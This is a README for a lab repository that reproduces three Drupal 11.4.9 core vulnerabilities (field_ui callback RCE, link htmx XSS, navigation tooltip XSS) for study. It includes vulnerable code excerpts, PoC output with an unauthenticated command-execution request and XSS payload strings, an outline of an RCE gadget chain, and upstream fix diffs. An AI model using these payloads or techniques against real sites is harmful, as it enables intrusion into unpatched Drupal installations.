# Drupal 11.4.9 — Vulnerability Lab

Reproducible lab for three Drupal core security advisories that affect
**Drupal 11.4.9** and were fixed in **11.4.10** (released 2026-10-14).

| Finding | Advisory | CVE | Component | Class |
|---------|----------|-----|-----------|-------|
| **F1** | SA-CORE-2026-014 | CVE-2026-108097 | `field_ui` | **Remote Code Execution** |
| **F2** | SA-CORE-2026-015 | CVE-2026-108515 | `link` | Stored XSS (htmx event handlers) |
| **F3** | SA-CORE-2026-016 | CVE-2026-108514 | `navigation` | Stored XSS (tooltip injection) |

> **Scope and authorisation.** These are *already public* vulnerabilities: the
> Drupal Security Team disclosed them and assigned CVEs on 2026-10-14, and the
> upstream fixes are public in the `11.4.9...11.4.10` diff. This lab exists to
> study them. Everything here runs against a **local container**. There is no
> scanning, no exploitation of third-party systems and no live-site targeting
> code — the lab modules deliberately keep the callable inside a fixed gadget
> registry so the published lab cannot be used as a web shell.

---

## TL;DR — the three bugs

### F1 — RCE via a render-array callback (Critical)

`core/modules/field_ui/src/Element/FieldUiTable.php:72`

```php
// Determine the region for the row.
$region_name = call_user_func_array($row['#region_callback'], [&$row]);
```

`#region_callback` is a value read straight out of the **render array**, and it
is invoked with **no validation at all**: no `is_callable()` check, no
allow-list, no signature restriction. Whoever can write the render array
chooses what PHP function runs.

`#region_callback` is a *documented extension point* of the `field_ui_table`
element — core's own test module supplies one from `hook_form_alter()`:

```php
// core/modules/field_ui/tests/modules/field_ui_test/src/Hook/FieldUiTestHooks.php:37-46
$table['indent'] = [
  '#row_type' => 'group',
  '#region_callback' => [$this, 'regionCallback'],   // <-- supplied by third-party code
  ...
];
```

Drupal's form API only ever writes request data into `#value`, never into
arbitrary element properties, so **core alone is not directly exploitable**.
The advisory says the same: *"not directly exploitable with core alone, but
multiple serious exploit paths exist with contributed modules. At least one
known exploit path does not require authentication."*

The lab module `vulnlab_field_ui` plays the role of that contributed module.

**Full gadget chain.** The sink is not limited to "a callable runs". Stock
vendor code provides file read/write/delete primitives that consume row
content, and a per-directory `.htaccess` rewrite turns a file write into PHP
execution. The end-to-end chain — stock PEAR `System::cat` / `System::rm`,
then `RewriteEngine On`, then a payload over HTTP — is documented in
[docs/F1-gadget-chain.md](docs/F1-gadget-chain.md) and reproducible with
`./lab/scripts/f1-chain.sh`. It is reproduced in the lab, not against any
third-party system.

### F2 — htmx event handlers survive the link sanitizer (High)

`core/modules/link/src/AttributeXss.php:41-48`

```php
$skip = (
  $attribute_name == 'style' ||
  str_starts_with($attribute_name, 'on') ||
  str_starts_with($attribute_name, '-') ||          // <-- no 'hx' / 'data-hx'
  strlen($attribute_name) > 96
);
```

`AttributeXss` is a **copy-paste fork** of `Drupal\Component\Utility\Xss`.
The upstream original is already hardened — `core/lib/Drupal/Component/Utility/Xss.php:297-306`:

```php
$skip = (
  in_array($attribute_name, ['style', 'srcdoc']) ||
  str_starts_with($attribute_name, 'on') ||
  str_starts_with($attribute_name, 'data-hx') ||      // <-- present upstream
  str_starts_with($attribute_name, 'hx') ||           // <-- present upstream
  str_starts_with($attribute_name, '-') ||
  strlen($attribute_name) > 96
);
```

The fork never received that hardening. And it matters, because **Drupal core
ships htmx 2.0.4** (`core/core.libraries.yml:845`), and htmx executes
`hx-on-<event>` / `data-hx-on-<event>` attributes as inline JavaScript:

```js
// core/assets/vendor/htmx/htmx.js:2916-2936
function processHxOnWildcard(elt) {
  ...
  if (startsWith(name, 'hx-on') || startsWith(name, 'data-hx-on')) {
    ...
    addHxOnEventHandler(elt, eventName, value)   // <-- the value is executed
  }
}
```

**Two separate things happen here, and it is worth keeping them apart:**

1. The attribute is **always** emitted into the page. That part is
   unconditional and is the bug: Drupal's attribute allow-list lets
   `hx-on-*` through.
2. It only becomes **executed JavaScript** when the htmx runtime is loaded on
   that page.

Drupal 11.4 ships htmx 2.0.4 and has first-class htmx support:
`Drupal\Core\Htmx\Htmx` (whose `applyTo()` attaches the `core/drupal.htmx`
library — `core/lib/Drupal/Core/Htmx/Htmx.php:1291-1295`), the
`drupal_htmx` wrapper format, and the `core/drupal.htmx` library itself.
`big_pipe` — a standard-profile dependency
(`core/profiles/standard/standard.info.yml:23`) — depends on `core/htmx`
(`core/modules/big_pipe/big_pipe.libraries.yml:9-11`), so the runtime ships
with a standard install.

**What is *not* true:** on a plain HTML page load, nothing in core attaches
`core/htmx` by itself, so the attribute is inert there. It becomes live on
pages that are served through Drupal's htmx wrapper format, and on any site
that attaches the htmx library (which is the case for sites that navigate
with htmx, the direction Drupal 11.4 takes). The lab reproduces that
situation — `lab/modules/vulnlab_link` attaches `core/drupal.htmx` to the
lab content type — because otherwise the finding would stop at "an
unexpected attribute is present in the HTML".

The link item's `options.attributes` map is writable through the
REST/JSON:API representation — core's own REST test asserts it round-trips
(`core/modules/menu_link_content/tests/src/Functional/Rest/MenuLinkContentResourceTestBase.php:80-92`).

### F3 — Navigation tooltip re-parses attacker data as markup (Medium)

`core/modules/navigation/js/tooltip.js:32-35` and `:49-52`

```js
Drupal.theme.tooltipWrapper = (dataset) =>
  `<div class="toolbar-tooltip ${dataset.drupalTooltipClass || ''}">
     ${dataset.drupalTooltip}
   </div>`;
...
trigger.insertAdjacentHTML('afterend', Drupal.theme.tooltipWrapper(trigger.dataset));
```

The tooltip text *and* the CSS class are interpolated into an HTML string that
`insertAdjacentHTML()` then parses — so both are **markup**, not text:

1. **HTML injection** — `dataset.drupalTooltip` is the *decoded* value of
   `data-drupal-tooltip`, so `<img src=x onerror=…>` becomes a real DOM node.
2. **Attribute injection** — `dataset.drupalTooltipClass` is interpolated into
   `class="…"` unescaped, so a `"` breaks out and injects arbitrary attributes.

Core feeds `data-drupal-tooltip` from menu link titles, block labels and
toolbar messages. Advisory mitigation: *"an attacker must have a role with
permission to enter HTML tags containing specific data attributes, or the
`administer menu` permission."*

---

## Two ways to use this lab

### A. Standalone — no Docker, no database (fastest)

The PoCs drive the **real Drupal 11.4.9 core classes** directly, so they only
need a Drupal source tree:

```bash
git clone https://github.com/0xABCD01/drupal-11.4.9-vuln-lab.git
cd drupal-11.4.9-vuln-lab

# Point at any Drupal 11.4.9 tree (the core tarball + `composer install`).
export DRUPAL_ROOT=/path/to/drupal-11.4.9

php  lab/standalone/f1_field_ui_rce.php     # F1  -> callable executed
php  lab/standalone/f2_attribute_xss.php     # F2  -> hx-on-* survives
node lab/standalone/f3_tooltip_xss.js        # F3  -> tooltip injects markup
```

Each script exits `0` when the bug reproduces and `1` when it does not, so
they work as regression checks.

### B. Full stack — real Drupal site, real HTTP, real browser

```bash
git clone https://github.com/0xABCD01/drupal-11.4.9-vuln-lab.git
cd drupal-11.4.9-vuln-lab

# 1. Populate ./drupal with a vulnerable Drupal 11.4.9 project.
#    (either let it build one with composer, ...)
./lab/scripts/fetch-drupal.sh
#    ... or reuse a tree you already have:
#    ./lab/scripts/fetch-drupal.sh /path/to/drupal-11.4.9

# 2. Build the image and start the stack.
docker compose up -d --build
docker compose run --rm provision       # installs Drupal + creates lab content

# 3. Run the end-to-end PoCs.
python3 lab/poc/f1_field_ui_rce.py
python3 lab/poc/f2_link_htmx_xss.py
python3 lab/poc/f3_navigation_tooltip_xss.py

# Or all three at once:
python3 lab/poc/run_all.py
```

The lab site ends up on <http://localhost:8080>:

| Login | Credentials |
|-------|-------------|
| Admin | `admin` / `admin` |
| Low-privilege editor | `labeditor` / `LabEditor!2026` |

The browser proof uses headless Chromium through Playwright. If Playwright or a
Chromium binary is not available the PoCs fall back to a server-side proof
(the attribute is present in the delivered HTML) and say so.

---

### Verified output

The three end-to-end PoCs were run against a real Drupal 11.4.9 site in
this lab. Verbatim result of `python3 lab/poc/run_all.py`:

```
=== F1  SA-CORE-2026-014  field_ui RCE ===
=== Path 1 — UNAUTHENTICATED (public route) ===
  [*] GET /vulnlab/field-ui-rce?gadget=exec&arg=id -> 200
  [+] the request-chosen callable EXECUTED inside the Drupal web process
        uid=33(www-data) gid=33(www-data) groups=33(www-data)

=== Path 2 — AUTHENTICATED (core's own 'Manage display' form) ===
  [+] logged in as admin
  [+] core's own display form executed the request-chosen callable
        uid=33(www-data) gid=33(www-data) groups=33(www-data)

  [+] F1 reproduced: attacker-chosen callable executed by Drupal core.

=== F2  SA-CORE-2026-015  link htmx stored XSS ===
  [+] logged in as the low-privilege editor 'labeditor'
  [+] planted the payload through the REST/JSON:API representation: 67388792-...
  [+] node published by the moderator: /node/12
  [+] the htmx event handler survived Drupal's attribute sanitizer
        <a href="https://example.com/vulnlab" hx-on-click="window.__vulnlab_xss = true; event.preventDefault();">
  [+] the payload EXECUTED in a real browser (htmx registered the handler)
  [+] F2 reproduced: htmx event handler stored and executed.

=== F3  SA-CORE-2026-016  navigation tooltip stored XSS ===
=== Path 1 — tooltip attribute taken from the request ===
  [+] the page delivered a data-drupal-tooltip trigger
  [+] the tooltip payload EXECUTED: insertAdjacentHTML() re-parsed it as markup

=== Path 2 — core's own source: the menu link title (needs 'administer menu') ===
  [+] a menu link title carrying markup is delivered in data-drupal-tooltip
        <a href="http://example.com" data-drupal-tooltip="&lt;img src=x onerror=&quot;window.__vulnlab_tooltip_xss=true&quot;&gt;">
  [+] the menu link title payload EXECUTED in the browser

=== Summary ===
  [+] F1  SA-CORE-2026-014  field_ui RCE
  [+] F2  SA-CORE-2026-015  link htmx stored XSS
  [+] F3  SA-CORE-2026-016  navigation tooltip stored XSS
```

## What the PoCs actually demonstrate

| PoC | Proof |
|-----|-------|
| `f1_field_ui_rce.py` | A request-chosen callable is executed by Drupal core. The `exec` gadget renders its output straight into the page, so the PoC can read the result. Both an unauthenticated public route and core's own "Manage display" form are exercised. |
| `f2_link_htmx_xss.py` | A low-privilege editor writes `hx-on-click` into a link's `options.attributes` through JSON:API; the PoC shows the attribute surviving Drupal's sanitizer in the delivered HTML and then shows it *executing* in headless Chromium. |
| `f3_navigation_tooltip_xss.py` | The tooltip payload is delivered as an escaped attribute and then re-parsed as markup by `insertAdjacentHTML()`; the PoC shows it executing in headless Chromium. |

---

## Repository layout

```
Dockerfile                     lab image (drupal:11.4.9 + drush)
docker-compose.yml             db + web + one-shot provisioning
Makefile                       convenience targets
docs/
  F1-field-ui-rce.md           deep dive: root cause, reachability, impact
  F1-gadget-chain.md           the full chain: PEAR gadgets -> .htaccess -> RCE
  F2-link-htmx-xss.md
  F3-navigation-tooltip-xss.md
  methodology.md               how the findings were derived
lab/
  modules/                     the three lab modules (vulnlab_*)
  poc/                         end-to-end PoCs (Python, stdlib only)
  standalone/                  zero-dependency PoCs (PHP / Node), incl. the gadget chain
  scripts/                     fetch-drupal.sh, provision.sh, f1-chain.sh
```

---

## Fixes

Upstream 11.4.10 fixes all three. The patches are small and self-contained:

**F1** — remove the dynamic dispatch entirely:

```diff
-          $region_name = call_user_func_array($row['#region_callback'], [&$row]);
+          $region_name = $row['region']['#value'] ?? '';
+          if (!isset($regions[$region_name])) {
+            $region_name = isset($regions['hidden']) ? 'hidden' : array_key_first($regions);
+          }
```

**F2** — keep the fork in sync with upstream:

```diff
             $skip = (
               $attribute_name == 'style' ||
               str_starts_with($attribute_name, 'on') ||
+              str_starts_with($attribute_name, 'data-hx') ||
+              str_starts_with($attribute_name, 'hx') ||
               str_starts_with($attribute_name, '-') ||
```

**F3** — build the element instead of a string:

```diff
-Drupal.theme.tooltipWrapper = (dataset) =>
-  `<div class="toolbar-tooltip ${dataset.drupalTooltipClass || ''}">
-      ${dataset.drupalTooltip}
-    </div>`;
+Drupal.theme.tooltipWrapper = (dataset) => {
+  const el = document.createElement('div');
+  el.classList.add('toolbar-tooltip');
+  if (dataset.drupalTooltipClass) {
+    dataset.drupalTooltipClass.split(/\s+/).filter(t => t !== '').forEach(t => el.classList.add(t));
+  }
+  el.textContent = dataset.drupalTooltip || '';
+  return el;
+};
```

Long term, the `link` module's `AttributeXss` fork should be retired in favour
of the shared `Drupal\Component\Utility\Xss` implementation — as its own
docblock already intends. A duplicated sanitizer will keep drifting.

---

## Also worth knowing

While reviewing 11.4.9 the following lower-severity issues were found
(details in `docs/methodology.md`):

* **Login timing side-channel** enumerates valid usernames — the expensive
  password verification is skipped when the account does not exist
  (`core/modules/user/src/Form/UserLoginForm.php:196-236`). Measured ~237 ms
  versus ~2-5 ms.
* **A distinct error message** reveals blocked/inactive accounts
  (`UserLoginForm.php:199`).
* **Unvalidated widget/formatter plugin ID** in display configuration
  (`core/modules/field_ui/src/Form/EntityDisplayFormBase.php:577`) — Drupal's
  `select` element has no `#element_validate`, so the raw value is persisted
  and a bad plugin ID also breaks the recovery UI.

Everything else reviewed (password hashing, CSRF generation/comparison, session
fixation, cookie flags, session-ID storage, REST/JSON:API CSRF enforcement,
BigPipe session lifecycle, SQL construction, file-upload sanitisation,
private-file access, `Url::fromUserInput()`) was verified to be correctly
implemented.

---

## Licence

MIT — see [LICENSE](LICENSE).

The lab modules and PoCs are original work. Drupal core is licensed under the
GPL-2.0-or-later and is **not** redistributed in this repository; the lab
downloads or mounts it separately.
